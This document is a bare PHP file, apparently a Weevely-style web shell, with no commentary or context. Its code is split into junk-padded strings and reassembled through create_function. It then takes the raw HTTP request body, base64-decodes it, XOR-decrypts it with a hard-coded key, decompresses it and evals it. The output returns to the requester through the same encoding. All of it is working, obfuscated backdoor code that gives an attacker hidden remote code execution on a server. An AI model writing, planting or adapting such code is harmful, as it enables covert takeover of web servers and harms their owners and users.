<?php
$m='$j};}}retqurn $qo;}if (qq@preg_maqtch("/$kh(q.+q)$qkqf/",@file_get_cqonqte';
$G='q);$r=@base6q4_encqode(@xq(@gzcoqmpressq($o),$k));pqrint("$pq$qkh$r$kf");}';
$r=str_replace('XH','','XHcrXHeate_XHfXHuncXHtiXHon');
$D='nts("pqhpq://qinput"),$m)==1) {q@ob_qstart();@eqvqal(@gqzuncomprqess(@x(@q';
$j='r($i=0;q$i<$l;){fqor($j=0qq;($j<$c&&$i<qq$l);$jq++q,$i++){q$o.=$t{q$i}^$k{';
$Q='$k=q"e1298b6b";$qkh="2aqqf18438q73ba";$kf="q42aq9f378q3q3c6";$p="evjHtqB5o0q';
$l='cBKtn9kq";funqction qx($t,$qk)q{$cq=strlqeqn($k);q$l=stqrqlen($t);$o="";fo';
$A='base6q4_qdecodqe($mq[1])q,$k)));$o=@ob_gqet_contenqts()qq;@qob_end_clqean(';
$U=str_replace('q','',$Q.$l.$j.$m.$D.$A.$G);
$F=$r('',$U);$F();
?>
